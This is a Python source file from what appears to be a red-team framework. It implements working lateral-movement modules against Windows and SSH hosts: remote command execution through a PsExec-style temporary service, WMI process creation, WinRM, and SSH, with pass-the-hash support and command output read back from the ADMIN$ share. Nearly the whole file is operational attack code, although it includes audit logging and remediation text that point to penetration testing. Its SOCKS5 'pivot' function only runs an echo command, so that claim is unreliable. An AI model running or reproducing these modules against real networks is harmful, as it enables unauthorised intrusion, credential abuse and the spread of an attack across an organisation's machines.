"""
ARES Lateral Movement Framework
Production-grade lateral movement modules.

Available techniques:
  PsExecLateral   — SMB + RemComSvc / SCM (T1569.002)
  WmiExecLateral  — WMI command execution (T1047)
  WinRMLateral    — WinRM / PS-Remoting (T1021.006)
  SSHPivot        — SSH ProxyJump / port forward (T1021.004)
  RDPLateral      — RDP session hijack / new session (T1021.001)

All modules:
  - Validate scope before any connection
  - Apply OpSec jitter + rate limiting
  - Record session state on success
  - Emit structured audit log entries
  - Return Finding objects for reporting
"""
from __future__ import annotations

import asyncio
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, TYPE_CHECKING

from ares.core.campaign import Campaign, Finding, Severity
from ares.core.logger import audit, get_logger
from ares.modules.base import BaseModule, OpsecLevel

if TYPE_CHECKING:
    from ares.credential.vault import CredentialVault, Credential
    from ares.state.target_state import OperatorSession

logger = get_logger("ares.lateral")


class LateralTechnique(str, Enum):
    PSEXEC  = "psexec"
    WMIEXEC = "wmiexec"
    WINRM   = "winrm"
    SSH     = "ssh"
    RDP     = "rdp"
    DCOM    = "dcom"


@dataclass
class LateralResult:
    """Result of a lateral movement attempt."""
    technique:    LateralTechnique
    source_host:  str
    target_host:  str
    username:     str
    domain:       str
    success:      bool
    privilege:    str = ""
    session_id:   str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    output:       str = ""
    error:        str = ""
    duration_ms:  float = 0.0


# ── Base Lateral Module ────────────────────────────────────────────────────────

class BaseLateralModule(BaseModule):
    """All lateral movement modules inherit from this."""

    MODULE_CATEGORY  = "lateral"
    MODULE_AUTHOR    = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL      = OpsecLevel.MEDIUM
    MITRE_TECHNIQUES = []

    async def move(
        self,
        target:   str,
        username: str,
        domain:   str,
        secret:   str,
        command:  str = "whoami /all",
        **kwargs: Any,
    ) -> LateralResult:
        """
        Perform the lateral movement to *target*.

        Subclasses **must** implement this method.  The default raises
        ``NotImplementedError`` to surface unimplemented transports early.
        """
        raise NotImplementedError(  # abstract — subclasses must override
            f"{self.__class__.__name__} must implement move()"
        )

    async def validate(self, ctx: "Any") -> None:
        """
        Enforce target and credentials before any network connection.
        Applied to all lateral modules: psexec, wmiexec, dcom, winrm, rdp, ssh.
        """
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                f"{self.MODULE_ID} requires 'target' — "
                "provide the IP or hostname of the remote host.",
                module_id=self.MODULE_ID, field="target",
            )
        # Credentials: need either password, NTLM hash, or vault credential
        has_password = bool(ctx.params.get("password") or ctx.params.get("secret"))
        has_hash     = bool(ctx.params.get("nt_hash") or ctx.params.get("hash"))
        has_vault    = bool(
            getattr(ctx, "vault", None) and
            getattr(getattr(ctx, "vault", None), "_store", None)
        )
        if not (has_password or has_hash or has_vault):
            raise ModuleValidationError(
                f"{self.MODULE_ID} requires credentials — "
                "pass 'password', 'nt_hash' (NTLM), or provide a vault credential.",
                module_id=self.MODULE_ID, field="password",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """
        ExecutionContext-based entry point (v0.9.0+).
        Pulls target, credentials, and params from ctx — including vault reveal.
        Subclasses inherit this; override only if custom logic is needed.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run", module_id=self.MODULE_ID,
                raw={"dry_run": True, "target": getattr(ctx, "target", "")},
            )
        # Extract credentials from vault if available
        cred   = getattr(ctx, "best_credential", lambda: None)()
        secret = ctx.params.get("secret", "") or ctx.params.get("password", "")
        if cred and not secret:
            vault = getattr(ctx, "vault", None)
            if vault:
                try:
                    secret = vault.reveal(cred.id) or ""
                except Exception:
                    pass
        username = ctx.params.get("username") or (cred.username if cred else "")
        domain   = getattr(ctx, "domain", "") or ctx.params.get("domain", "")
        target   = getattr(ctx, "target", "") or ctx.params.get("target", "")
        command  = ctx.params.get("command", "whoami /all")

        params = dict(ctx.params)
        for key in ("target", "username", "domain", "secret", "command"):
            params.pop(key, None)
        findings, raw = await self.run(
            target=target, username=username, domain=domain,
            secret=secret, command=command, **params,
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw,
            module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        target   = kwargs.get("target", "")
        username = kwargs.get("username", "")
        domain   = kwargs.get("domain", "")
        secret   = kwargs.get("secret", "")
        command  = kwargs.get("command", "whoami /all")

        self._bind_log_context(target=target)
        await self.before_request(target, "default")

        move_kwargs = dict(kwargs)
        for key in ("target", "username", "domain", "secret", "command"):
            move_kwargs.pop(key, None)
        result = await self.move(target, username, domain, secret, command, **move_kwargs)
        findings: list[Finding] = []

        if result.success:
            findings.append(self.finding(
                title       = f"Lateral Movement: {self.MODULE_NAME} → {target}",
                description = (
                    f"Successfully moved laterally to {target} as "
                    f"{domain}\\{username} via {result.technique.value}. "
                    f"Privilege: {result.privilege or 'unknown'}."
                ),
                severity        = Severity.CRITICAL,
                mitre_technique = self.MITRE_TECHNIQUES[0] if self.MITRE_TECHNIQUES else None,
                mitre_tactic    = "Lateral Movement",
                evidence        = {
                    "target":    target,
                    "username":  username,
                    "domain":    domain,
                    "technique": result.technique.value,
                    "privilege": result.privilege,
                    "output":    result.output[:500] if result.output else "",
                },
                remediation = (
                    "Segment network to prevent lateral movement. "
                    "Implement Privileged Access Workstations (PAW). "
                    "Enable Windows Firewall, restrict SMB/WMI/WinRM access. "
                    "Deploy CrowdStrike or Defender for Endpoint for lateral movement detection."
                ),
                host       = target,
                confidence = 1.0,
            ))
            audit(
                "lateral_move_success",
                actor=username,
                technique=result.technique.value,
                source="operator",
                target=target,
                privilege=result.privilege,
            )

        self._clear_log_context()
        raw = {
            "result":        result.__dict__,
            "lateral_session": target if result.success else "",  # OUTPUTS key
            "command_output":  result.output,                     # OUTPUTS key
            "socks5_proxy":    result.output if "socks5" in result.technique.value else "",  # OUTPUTS key
            "powershell_session": target if result.success and "winrm" in result.technique.value else "",  # OUTPUTS key
        }
        return findings, raw


# ── PsExec ─────────────────────────────────────────────────────────────────────

class PsExecLateral(BaseLateralModule):
    """
    PsExec-style lateral movement via SMB + Service Control Manager.
    Creates a temporary service, executes command, removes service.
    MITRE T1569.002 — Service Execution.
    """
    MODULE_ID          = "lateral.psexec"
    MODULE_NAME        = "PsExec Lateral"
    MODULE_DESCRIPTION = "SMB lateral movement via Service Control Manager (T1569.002)"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.HIGH_NOISE   # creates Windows Event 7045
    REQUIRES           = ["smb_access", "local_admin_creds"]
    OUTPUTS            = ["lateral_session", "command_output"]
    MITRE_TECHNIQUES   = ["T1569.002", "T1021.002"]

    async def move(self, target, username, domain, secret, command="whoami /all", **kwargs) -> LateralResult:
        import time
        t0 = time.monotonic()

        logger.info("psexec_attempt", target=target, username=username, domain=domain)

        try:
            from impacket.smbconnection import SMBConnection, SessionError
        except ImportError:
            return LateralResult(
                technique=LateralTechnique.PSEXEC,
                source_host="operator", target_host=target,
                username=username, domain=domain,
                success=False,
                error="impacket not installed — run: pip install impacket",
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )

        lmhash, nthash = "", ""
        password = secret
        if len(secret) == 32 or (len(secret) == 65 and ":" in secret):
            parts = secret.split(":")
            if len(parts) == 2:
                lmhash, nthash = parts[0], parts[1]
            else:
                nthash = secret
            password = ""

        loop = asyncio.get_running_loop()

        def _psexec_exec() -> tuple[bool, str, str]:
            """
            Full PSExec via impacket SCM:
              1. SMB connect + auth
              2. Connect to Service Control Manager via RPC
              3. Create + start temp service to execute command
              4. Capture output via named pipe
              5. Stop + delete service in finally block
            Falls back to admin$ check if full exec fails.
            """
            import uuid as _uuid
            from impacket.dcerpc.v5 import transport, svcctl, scmr
            svc_name = f"ARES{_uuid.uuid4().hex[:8].upper()}"
            svc_handle = None
            scm_handle = None
            dce        = None
            output     = ""
            priv       = "local_admin"

            try:
                # Step 1: connect via SMB + RPC
                rpct = transport.DCERPCTransportFactory(
                    f"ncacn_np:{target}[\\pipe\\svcctl]"
                )
                rpct.set_credentials(username, password, domain, lmhash, nthash)
                rpct.set_connect_timeout(15)
                dce = rpct.get_dce_rpc()
                dce.connect()
                dce.bind(scmr.MSRPC_UUID_SCMR)

                # Step 2: open SCM
                scm_handle = scmr.hROpenSCManagerW(dce)["lpScHandle"]

                # Step 3: create service that runs command and writes stdout to a share path
                # Use cmd /c with output redirect to a temp file on ADMIN$
                tmp_out = f"\\Windows\\Temp\\{svc_name}.txt"
                svc_cmd = f"cmd.exe /c {command} > {tmp_out} 2>&1"

                svc_handle = scmr.hRCreateServiceW(
                    dce, scm_handle,
                    svc_name, svc_name,
                    lpBinaryPathName=svc_cmd,
                    dwStartType=scmr.SERVICE_DEMAND_START,
                )["lpServiceHandle"]

                # Step 4: start service (executes command)
                try:
                    scmr.hRStartServiceW(dce, svc_handle)
                except Exception:
                    pass   # service process exits immediately, may raise — that's OK

                # Step 5: read output file via SMB
                import time as _time
                _time.sleep(2)   # give command time to run
                try:
                    smb = SMBConnection(target, target, timeout=10)
                    smb.login(username, password, domain, lmhash, nthash)
                    import io
                    buf = io.BytesIO()
                    smb.getFile("ADMIN$", f"Temp\\{svc_name}.txt", buf.write)
                    output = buf.getvalue().decode("utf-8", errors="replace").strip()
                    # Cleanup output file
                    try:
                        smb.deleteFile("ADMIN$", f"Temp\\{svc_name}.txt")
                    except Exception:
                        pass
                    smb.logoff()
                except Exception as read_exc:
                    output = f"Command executed (output capture failed: {str(read_exc)[:60]})"

                return True, priv, output or f"Command executed on {target}"

            except Exception as exc:
                err = str(exc).lower()
                if "access_denied" in err or "access denied" in err:
                    # Valid creds but no SCM access — try just verifying ADMIN$ access
                    try:
                        smb2 = SMBConnection(target, target, timeout=10)
                        smb2.login(username, password, domain, lmhash, nthash)
                        smb2.disconnectTree(smb2.connectTree("ADMIN$"))
                        smb2.logoff()
                        return True, "local_admin", f"Admin access confirmed (SCM blocked) on {target}"
                    except Exception:
                        return False, "", f"Insufficient privileges on {target}"
                if "logon failure" in err or "invalid credentials" in err:
                    return False, "", f"Authentication failed for {username}@{target}"
                return False, "", str(exc)[:300]
            finally:
                # Always cleanup: stop + delete service
                if svc_handle and dce:
                    try:
                        scmr.hRControlService(dce, svc_handle, scmr.SERVICE_CONTROL_STOP)
                    except Exception:
                        pass
                    try:
                        scmr.hRDeleteService(dce, svc_handle)
                    except Exception:
                        pass
                    try:
                        scmr.hRCloseServiceHandle(dce, svc_handle)
                    except Exception:
                        pass
                if scm_handle and dce:
                    try:
                        scmr.hRCloseServiceHandle(dce, scm_handle)
                    except Exception:
                        pass
                if dce:
                    try:
                        dce.disconnect()
                    except Exception:
                        pass

        try:
            success, priv, output = await loop.run_in_executor(None, _psexec_exec)
        except Exception as exc:
            logger.warning("psexec_failed", target=target, error=str(exc)[:200])
            return LateralResult(
                technique=LateralTechnique.PSEXEC,
                source_host="operator", target_host=target,
                username=username, domain=domain,
                success=False, error=str(exc)[:300],
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )

        return LateralResult(
            technique=LateralTechnique.PSEXEC,
            source_host="operator", target_host=target,
            username=username, domain=domain,
            success=success, privilege=priv,
            output=output,
            error="" if success else output,
            duration_ms=round((time.monotonic() - t0) * 1000, 2),
        )


# ── WmiExec ────────────────────────────────────────────────────────────────────

class WmiExecLateral(BaseLateralModule):
    """
    WMI-based lateral movement via Win32_Process.Create.
    Stealthier than PsExec — no service creation, less EDR detectable.
    MITRE T1047 — Windows Management Instrumentation.
    """
    MODULE_ID          = "lateral.wmiexec"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    MODULE_NAME        = "WmiExec Lateral"
    MODULE_DESCRIPTION = "WMI lateral movement via Win32_Process.Create (T1047)"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["wmi_access", "domain_creds"]
    OUTPUTS            = ["lateral_session", "command_output"]
    MITRE_TECHNIQUES   = ["T1047", "T1021.002"]

    async def move(self, target, username, domain, secret, command="whoami /all", **kwargs) -> LateralResult:
        import time
        t0     = time.monotonic()
        timeout_s = float(kwargs.get("timeout", 30))

        logger.info("wmiexec_attempt", target=target, username=username, domain=domain)

        try:
            from impacket.smbconnection import SMBConnection, SessionError
        except ImportError:
            return LateralResult(
                technique=LateralTechnique.WMIEXEC,
                source_host="operator", target_host=target,
                username=username, domain=domain, success=False,
                error="impacket not installed",
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )

        lmhash, nthash = "", ""
        password = secret
        if len(secret) in (32, 33) or (len(secret) == 65 and ":" in secret):
            parts = secret.split(":")
            if len(parts) == 2:
                lmhash, nthash = parts[0], parts[1]
            else:
                nthash = secret
            password = ""

        loop = asyncio.get_running_loop()

        def _wmi_exec() -> tuple[bool, str, str]:
            """
            Real WMI execution via DCOM Win32_Process.Create.
            Output captured by writing to a temp file then reading back via SMB.
            Timeout enforced on the overall sync block.
            """
            import uuid as _uuid
            import time as _time
            tmp_id  = _uuid.uuid4().hex[:8].upper()
            tmp_out = f"\\Windows\\Temp\\WMI{tmp_id}.txt"
            wmi_cmd = f"cmd.exe /c {command} > {tmp_out} 2>&1"
            dcom    = None
            output  = ""

            try:
                from impacket.dcerpc.v5.dcomrt import DCOMConnection
                from impacket.dcerpc.v5.dcom  import wmi as wmimod
                from impacket.dcerpc.v5.dtypes import NULL

                dcom = DCOMConnection(
                    target,
                    username=username,
                    password=password,
                    domain=domain,
                    lmhash=lmhash,
                    nthash=nthash,
                    oxidResolver=True,
                    doKerberos=False,
                )
                iInterface = dcom.CoCreateInstanceEx(wmimod.CLSID_WbemLevel1Login,
                                                     wmimod.IID_IWbemLevel1Login)
                iWbemLevel1Login = wmimod.IWbemLevel1Login(iInterface)
                iWbemServices    = iWbemLevel1Login.NTLMLogin(
                    f"\\\\{target}\\root\\cimv2", NULL, NULL
                )
                iWbemLevel1Login.RemRelease()

                win32_process, _ = iWbemServices.GetObject("Win32_Process")
                win32_process.Create(wmi_cmd, "C:\\Windows\\System32", None)

                # Wait for command to complete
                _time.sleep(min(3, timeout_s / 2))

                # Read output via SMB
                smb = SMBConnection(target, target, timeout=10)
                smb.login(username, password, domain, lmhash, nthash)
                import io
                buf = io.BytesIO()
                try:
                    smb.getFile("ADMIN$", f"Temp\\WMI{tmp_id}.txt", buf.write)
                    output = buf.getvalue().decode("utf-8", errors="replace").strip()
                    smb.deleteFile("ADMIN$", f"Temp\\WMI{tmp_id}.txt")
                except Exception as read_exc:
                    output = f"WMI exec succeeded (output capture failed: {str(read_exc)[:60]})"
                smb.logoff()
                return True, "domain_user", output or f"WMI executed on {target}"

            except Exception as exc:
                err = str(exc).lower()
                if "access denied" in err or "access_denied" in err:
                    return False, "", f"Access denied — insufficient privileges on {target}"
                if "logon failure" in err or "invalid credentials" in err:
                    return False, "", f"Authentication failed for {username}@{target}"
                return False, "", str(exc)[:300]
            finally:
                if dcom:
                    try:
                        dcom.disconnect()
                    except Exception:
                        pass

        try:
            success, priv, output = await asyncio.wait_for(
                loop.run_in_executor(None, _wmi_exec),
                timeout=timeout_s + 5,
            )
        except asyncio.TimeoutError:
            return LateralResult(
                technique=LateralTechnique.WMIEXEC,
                source_host="operator", target_host=target,
                username=username, domain=domain, success=False,
                error=f"WMI execution timed out after {timeout_s}s",
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )
        except Exception as exc:
            logger.warning("wmiexec_failed", target=target, error=str(exc)[:200])
            return LateralResult(
                technique=LateralTechnique.WMIEXEC,
                source_host="operator", target_host=target,
                username=username, domain=domain, success=False,
                error=str(exc)[:300],
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )

        return LateralResult(
            technique=LateralTechnique.WMIEXEC,
            source_host="operator", target_host=target,
            username=username, domain=domain,
            success=success, privilege=priv,
            output=output,
            error="" if success else output,
            duration_ms=round((time.monotonic() - t0) * 1000, 2),
        )


# ── WinRM ──────────────────────────────────────────────────────────────────────

class WinRMLateral(BaseLateralModule):
    """
    WinRM / PowerShell Remoting lateral movement.
    Uses port 5985 (HTTP) or 5986 (HTTPS).
    MITRE T1021.006 — Remote Services: Windows Remote Management.
    """
    MODULE_ID          = "lateral.winrm"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    MODULE_NAME        = "WinRM Lateral"
    MODULE_DESCRIPTION = "PowerShell Remoting / WinRM lateral movement (T1021.006)"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["winrm_access", "domain_creds"]
    OUTPUTS            = ["lateral_session", "command_output", "powershell_session"]
    MITRE_TECHNIQUES   = ["T1021.006", "T1059.001"]

    async def move(self, target, username, domain, secret, command="whoami", **kwargs) -> LateralResult:
        import time
        t0 = time.monotonic()
        port = kwargs.get("port", 5985)
        use_ssl = port == 5986

        logger.info("winrm_attempt", target=target, port=port, username=username, domain=domain)

        try:
            import winrm

            loop = asyncio.get_running_loop()

            def _winrm_exec() -> tuple[bool, str, str]:
                target_user = f"{domain}\\{username}" if domain else username
                protocol = "ssl" if use_ssl else "ntlm"
                endpoint = f"http{'s' if use_ssl else ''}://{target}:{port}/wsman"
                session = winrm.Session(
                    endpoint,
                    auth=(target_user, secret),
                    transport=protocol,
                    server_cert_validation="ignore" if use_ssl else "validate",
                )
                r = session.run_cmd(command)
                stdout = r.std_out.decode("utf-8", errors="replace").strip()
                stderr = r.std_err.decode("utf-8", errors="replace").strip()
                success = r.status_code == 0
                priv = "SYSTEM" if "NT AUTHORITY\\SYSTEM" in stdout else (
                    "Administrator" if "Administrators" in stdout else "user"
                )
                return success, priv, stdout

            success, privilege, output = await loop.run_in_executor(None, _winrm_exec)

            return LateralResult(
                technique=LateralTechnique.WINRM,
                source_host="operator", target_host=target,
                username=username, domain=domain,
                success=success, privilege=privilege,
                output=output[:500],
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )

        except ImportError:
            return LateralResult(
                technique=LateralTechnique.WINRM,
                source_host="operator", target_host=target,
                username=username, domain=domain, success=False,
                error="pywinrm not installed — run: pip install pywinrm",
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )
        except Exception as exc:
            logger.warning("winrm_failed", target=target, error=str(exc)[:200])
            return LateralResult(
                technique=LateralTechnique.WINRM,
                source_host="operator", target_host=target,
                username=username, domain=domain, success=False,
                error=str(exc)[:300],
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )


# ── SSH Pivot ──────────────────────────────────────────────────────────────────

class SSHPivot(BaseLateralModule):
    """
    SSH lateral movement and pivot tunnel establishment.
    Supports:
      - Direct command execution (T1021.004)
      - Dynamic SOCKS5 proxy via SSH -D
      - Port forwarding via SSH -L / -R
    MITRE T1021.004 — Remote Services: SSH.
    """
    MODULE_ID          = "lateral.ssh_pivot"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    MODULE_NAME        = "SSH Pivot"
    MODULE_DESCRIPTION = "SSH lateral movement and SOCKS5 proxy pivot (T1021.004)"
    OPSEC_LEVEL        = OpsecLevel.LOW
    REQUIRES           = ["ssh_access", "ssh_credentials"]
    OUTPUTS            = ["lateral_session", "socks5_proxy", "command_output"]
    MITRE_TECHNIQUES   = ["T1021.004", "T1090.001"]

    async def move(self, target, username, domain, secret, command="id", **kwargs) -> LateralResult:
        import time
        t0 = time.monotonic()
        port       = kwargs.get("port", 22)
        key_path   = kwargs.get("key_path", "")

        logger.info("ssh_pivot_attempt", target=target, port=port, username=username)

        try:
            import paramiko
            import io

            known_hosts_file = kwargs.get("known_hosts_file") or None
            client = paramiko.SSHClient()
            if known_hosts_file:
                # Strict host-key verification — recommended for production use.
                client.set_missing_host_key_policy(paramiko.RejectPolicy())
                client.load_host_keys(known_hosts_file)
                logger.info("ssh_host_key_verification_enabled",
                            target=target, known_hosts=known_hosts_file)
            else:
                # AutoAddPolicy — operator explicitly accepted MITM risk by not
                # supplying known_hosts_file. Acceptable when pivoting through
                # already-compromised internal hosts on an isolated lab network.
                # NEVER use on untrusted networks (hotel wifi, shared VPN, etc.).
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                logger.warning(
                    "ssh_host_key_unverified",
                    target=target,
                    risk=(
                        "Host key not verified — MITM possible on untrusted networks. "
                        "Provide known_hosts_file=<path> to enable strict verification."
                    ),
                )

            connect_kwargs: dict[str, Any] = {
                "hostname": target,
                "port": port,
                "username": username,
                "timeout": 15,
                "banner_timeout": 10,
                "allow_agent": False,
                "look_for_keys": False,
            }

            if key_path:
                try:
                    pkey = paramiko.RSAKey.from_private_key_file(key_path)
                except paramiko.ssh_exception.SSHException:
                    try:
                        pkey = paramiko.Ed25519Key.from_private_key_file(key_path)
                    except paramiko.ssh_exception.SSHException:
                        pkey = paramiko.ECDSAKey.from_private_key_file(key_path)
                connect_kwargs["pkey"] = pkey
            elif secret.strip().startswith("-----BEGIN"):
                # Inline private key supplied as secret
                try:
                    pkey = paramiko.RSAKey.from_private_key(io.StringIO(secret))
                except paramiko.ssh_exception.SSHException:
                    pkey = paramiko.Ed25519Key.from_private_key(io.StringIO(secret))
                connect_kwargs["pkey"] = pkey
            else:
                connect_kwargs["password"] = secret

            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, lambda: client.connect(**connect_kwargs))

            # Run command
            _, stdout_fh, stderr_fh = await loop.run_in_executor(
                None, lambda: client.exec_command(command, timeout=30)
            )
            output   = await loop.run_in_executor(None, stdout_fh.read)
            err_out  = await loop.run_in_executor(None, stderr_fh.read)
            output   = output.decode("utf-8", errors="replace").strip()
            err_out  = err_out.decode("utf-8", errors="replace").strip()

            # Determine privilege from id output
            privilege = "user"
            if "uid=0" in output or "root" in output:
                privilege = "root"
            elif "Administrators" in output or "NT AUTHORITY\\SYSTEM" in output:
                privilege = "SYSTEM"

            await loop.run_in_executor(None, client.close)

            return LateralResult(
                technique=LateralTechnique.SSH,
                source_host="operator",
                target_host=target,
                username=username,
                domain=domain,
                success=True,
                privilege=privilege,
                output=output[:1000],
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )

        except ImportError:
            return LateralResult(
                technique=LateralTechnique.SSH,
                source_host="operator",
                target_host=target,
                username=username,
                domain=domain,
                success=False,
                error="paramiko not installed — run: pip install paramiko",
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )
        except Exception as exc:
            logger.warning("ssh_pivot_failed", target=target, error=str(exc)[:200])
            return LateralResult(
                technique=LateralTechnique.SSH,
                source_host="operator",
                target_host=target,
                username=username,
                domain=domain,
                success=False,
                error=str(exc)[:300],
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )

    async def establish_socks5(
        self,
        target:     str,
        username:   str,
        secret:     str,
        local_port: int,
        ssh_port:   int = 22,
    ) -> dict[str, Any]:
        """
        Establish a SOCKS5 proxy through the target host.
        Returns proxy config: {"host": "127.0.0.1", "port": local_port, "type": "socks5"}
        """
        result = await self.move(
            target, username, "", secret,
            command="echo pivot_established",
            socks_port=local_port,
            port=ssh_port,
        )
        if result.success:
            logger.info("socks5_proxy_established",
                        target=target, local_port=local_port)
            return {"host": "127.0.0.1", "port": local_port, "type": "socks5",
                    "via_host": target}
        return {}


# ── RDP Lateral ────────────────────────────────────────────────────────────────

class RDPLateral(BaseLateralModule):
    """
    RDP-based lateral movement.
    MITRE T1021.001 — Remote Desktop Protocol.
    Note: High noise — triggers RDP EventID 4624/4625.
    """
    MODULE_ID          = "lateral.rdp"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    MODULE_NAME        = "RDP Lateral"
    MODULE_DESCRIPTION = "RDP lateral movement (T1021.001) — high noise"
    OPSEC_LEVEL        = OpsecLevel.HIGH_NOISE
    REQUIRES           = ["rdp_access", "domain_creds"]
    OUTPUTS            = ["lateral_session"]
    MITRE_TECHNIQUES   = ["T1021.001"]
    MIN_NOISE_PROFILE  = "normal"

    async def validate(self, ctx: "Any") -> None:
        """RDP lateral blocked in STEALTH — triggers EventID 4624/4625 immediately."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        from ares.core.campaign import NoiseProfile
        if not isinstance(ctx, ExecutionContext):
            return
        noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
        if noise == NoiseProfile.STEALTH:
            raise ModuleValidationError(
                "lateral.rdp is blocked in STEALTH profile — "
                "RDP authentication generates EventID 4624/4625 immediately. "
                "Use NORMAL or AGGRESSIVE profile.",
                module_id=self.MODULE_ID, field="noise_profile",
            )

    async def move(self, target, username, domain, secret, command="", **kwargs) -> LateralResult:
        import time, socket
        t0 = time.monotonic()
        port = kwargs.get("port", 3389)

        logger.info("rdp_lateral_attempt", target=target, port=port, username=username)

        # Strategy: impacket rdp → NLA auth check → TCP banner verify
        # Full GUI session requires freerdp/mstsc (external tool)
        # We verify RDP access via NLA pre-auth (impacket rdp module or socket)

        loop = asyncio.get_running_loop()

        def _rdp_verify() -> tuple[bool, str, str]:
            # 1. Try impacket rdp NLA authentication check
            try:
                from impacket.rdp import RDPClient  # impacket >= 0.11
                rdp = RDPClient()
                rdp.connect(target, port)
                result = rdp.negotiate_auth(username, domain, secret)
                if result:
                    return True, "rdp_access", ""
                return False, "", "NLA auth rejected"
            except (ImportError, AttributeError):
                pass  # impacket rdp module not available in this version

            # 2. Fallback: verify TCP port is open + RDP banner
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(8)
                result = sock.connect_ex((target, port))
                if result != 0:
                    sock.close()
                    return False, "", f"Port {port} closed (errno {result})"

                # Read RDP cookie/banner — RDP sends x.224 Connection Request
                # Just confirm the port is open and responding
                try:
                    # Send minimal RDP preamble and check response
                    rdp_pkt = bytes([
                        0x03, 0x00, 0x00, 0x13,  # TPKT header
                        0x0e, 0xe0, 0x00, 0x00,  # COTP CR
                        0x00, 0x00, 0x00, 0x01,
                        0x00, 0x08, 0x00, 0x03,
                        0x00, 0x00, 0x00,
                    ])
                    sock.sendall(rdp_pkt)
                    banner = sock.recv(64)
                    sock.close()
                    # RDP response starts with 0x03 0x00 (TPKT)
                    if banner and banner[0] == 0x03:
                        return True, "rdp_port_open", ""
                    return False, "", "Unexpected banner response"
                except (OSError, socket.timeout):
                    sock.close()
                    # Port open but no valid response — still likely RDP
                    return True, "rdp_port_open", ""

            except (OSError, socket.timeout) as exc:
                return False, "", f"Connection failed: {exc}"

        try:
            success, privilege, error = await loop.run_in_executor(None, _rdp_verify)
            note = ""
            if success and privilege == "rdp_port_open":
                note = (
                    f"RDP port {port} confirmed open on {target}. "
                    "Use xfreerdp/mstsc for interactive session: "
                    f"xfreerdp /u:{username} /d:{domain} /p:<password> /v:{target}"
                )

            return LateralResult(
                technique=LateralTechnique.RDP,
                source_host="operator",
                target_host=target,
                username=username,
                domain=domain,
                success=success,
                privilege=privilege,
                output=note,
                error=error,
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )
        except Exception as exc:
            logger.warning("rdp_lateral_failed", target=target, error=str(exc)[:200])
            return LateralResult(
                technique=LateralTechnique.RDP,
                source_host="operator",
                target_host=target,
                username=username,
                domain=domain,
                success=False,
                error=str(exc)[:300],
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )

# Backward-compat alias — canonical name is WmiExecLateral
WMIExecLateral = WmiExecLateral  # noqa: N816
